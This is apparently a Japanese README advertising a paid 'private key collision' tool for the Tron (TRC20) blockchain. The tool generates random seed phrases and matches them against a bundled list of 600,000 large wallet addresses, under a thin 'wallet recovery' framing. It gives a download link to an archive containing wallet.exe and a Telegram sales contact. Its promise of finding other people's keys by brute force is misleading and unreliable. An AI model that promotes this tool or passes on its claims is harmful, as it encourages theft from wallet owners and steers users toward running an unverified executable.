<p align="center">
	<img alt="logo"  src="./img/logo.png">
</p>
<h4 align="center"> トリックプライベートキー・コリジョンツール（TRC20）</h4>
<p align="center"> バージョン：v1.0.0</p>
<p align="center">
  <a href="README.md">
    <img src="https://img.shields.io/badge/-简体中文-red.svg" style="margin:0 5px">
  </a>
  <a href="README_zh-TW.md">
    <img src="https://img.shields.io/badge/-繁体中文-brightgreen.svg" style="margin:0 5px">
  </a>
  <a href="README_EN.md">
    <img src="https://img.shields.io/badge/-English-yellow.svg" style="margin:0 5px">
  </a>
  <a href="README_ja.md">
    <img src="https://img.shields.io/badge/-日本語-green.svg" style="margin:0 5px">
  </a>
  <a href="README_ko.md">
    <img src="https://img.shields.io/badge/-한국어-blue.svg" style="margin:0 5px">
  </a>
  <a href="README_es.md">
    <img src="https://img.shields.io/badge/-Español-purple.svg" style="margin:0 5px">
  </a>
</p>

<img alt="logo"  src="./img/main_rby.png">

## プロジェクト概要

トリックプライベートキー・コリジョンツールは、TRC20（トロンブロックチェーン）に焦点を当てたプライベートキー・コリジョンスマートシステムです。このソフトウェアは、BIP39プロトコルに従ってランダムに12桁のシードフレーズを生成し、生成されたアドレスをインポートされた監視アドレスと比較して、早期に安価で購入した後、シードフレーズを忘れたTRC20ウォレットを回復します。

## 適用対象

- シードフレーズ/プライベートキーを紛失し、回復が必要なユーザー
- 余剰パソコンを持ち、プログラムを自動実行したいユーザー
- 運に頼って機会を見つけたい佛系ユーザー

## ソフトウェアの優位性

1. **TRC20に焦点**：トロンブロックチェーン専用に設計され、コリジョンアルゴリズムを最適化し、コリジョン効率を向上させました。
2. **効率的なコリジョン**：大規模な並列計算をサポートし、コリジョン速度を大幅に向上させました。
3. **ユーザーフレンドリー**：シンプルで直感的なユーザーインターフェースにより、専門知識なしに簡単に操作できます。
4. **継続的な更新**：ソフトウェアを定期的に更新し、脆弱性を修正し、新機能を追加して、ソフトウェアの先進性を維持します。
5. **大口ウォレットの監視**：大口ウォレットを継続的に監視し、コリジョン目標をタイムリーに更新して、成功率を向上させます。
6. **オフライン実行**：オフラインでの断網実行をサポートし、ユーザーのプライバシーを保護し、ネットワーク攻撃を回避します。
7. **価格の優位性**：市場上の他のコリジョンツールと比較して、価格がより最適化され、コストパフォーマンスが高いです。
8. **多言語サポート**：異なる地域のユーザーのニーズを満たすため、多种の言語インターフェースをサポートします。
9. **高セキュリティ**：高度な暗号化技術を採用し、ユーザーのシードフレーズとプライベートキーのセキュリティを確保します。
10. **コミュニティサポート**：活発なコミュニティを有し、ユーザーはコミュニティで助けとサポートを受けることができます。

## インストール手順

1. インストールパッケージをダウンロードして解凍します。[ここをクリックしてダウンロード](https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar )
2. コリジョンが必要なウォレットアドレスを`input`ディレクトリに置きます（現在、60万の大口ウォレットアドレスが付属しています）
3. `wallet.exe`を実行してプログラムを起動します
4. 実行に成功した後、【開始】ボタンをクリックします

## ディレクトリ構造

- `data`：プログラム実行中のデータを保存するためのデータディレクトリ
- `input`：コリジョンウォレットディレクトリ。コリジョンが必要なウォレットアドレスを格納します。
- `success`：コリジョン成功後のストレージディレクトリ。コリジョン成功したウォレット情報を格納し、`SUCCESS_WALLET.txt`にシードフレーズを保存します。

## お問い合わせ

何か問題がある場合は、我们的オンラインカスタマーサービスにお問い合わせください：
- Telegram：[魚客服](<url id="d01rjk3djm8re1t2o3h0" type="url" status="failed" title="" wc="0">https://t.me/web3_dev_gg</url> ) <br>
  <img alt="logo"   src="./img/tg.png">
## 注意事項

- シードフレーズのコリジョンにはある程度のリスクと不確実性があり、法律や道徳の問題を引き起こす可能性があります。ユーザーがウォレットを回復しようとする際には、関連するリスクを十分に理解し、自身の行為が法律法规に適合することを確認してください。
- ネットワークの原因により、一部のリンクが正常にアクセスできない場合があります。リンクの合法性を確認し、適宜再試行してください。